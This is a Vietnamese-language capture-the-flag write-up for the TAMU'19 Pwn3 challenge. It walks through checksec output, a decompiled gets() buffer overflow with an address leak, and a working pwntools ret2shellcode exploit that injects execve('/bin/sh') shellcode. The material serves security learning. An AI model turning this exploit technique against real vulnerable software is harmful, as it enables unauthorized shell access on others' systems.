# TAMU'19 Pwn3

Dùng file và checksec kiểm tra:

```
$	file pwn3
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped

$	checksec pwn3
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      PIE enabled
Stack:    Executable
RWX:      Has RWX segments
```

File 32 bits, arch i386 và PIE có kích hoạt  
Thấy stack có thể thực thi -> nghĩ ngay đến phương pháp ret2shellcode  
Sử dụng ghidra để reverse file, thấy hàm echo đã mác lỗi buffer overflow:  

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void echo(void)

{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

Hàm echo in ra địa chỉ trong stack của mảng local_12e, sau đó nhận input:

```
$	./pwn3
Take this, you might need it on your journey 0xffc0e9ae!
```

Chúng ta sẽ đẩy shellcode thực thi execve("/bin/sh"), sau đó ghi đè địa chỉ save rip trong stack của hàm echo bằng địa chỉ đã bị leak để thay đổi luồng của chương trình  
Ý tưởng đã có, giờ viết code khai thác:  

```
#!/usr/bin/python3
from pwn import *
exe = ELF("./pwn3", checksec = False)
con = process("./pwn3")
shellcode = asm(
    '''
    mov eax, 0x0b
    push 6845231 ;u32("/sh\0")
    push 1852400175 ;u32("/bin")
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch = 'i386')
con.recvuntil(b"journey ")
leak = con.recvline().decode("utf-8")
leak = int(leak.strip("!\n"), 16)
print(hex(leak))
payload = shellcode 
payload = payload.ljust(302)
payload += p32(leak)
con.sendline(payload)
con.interactive()
```

Cho chạy code và lấy được flag
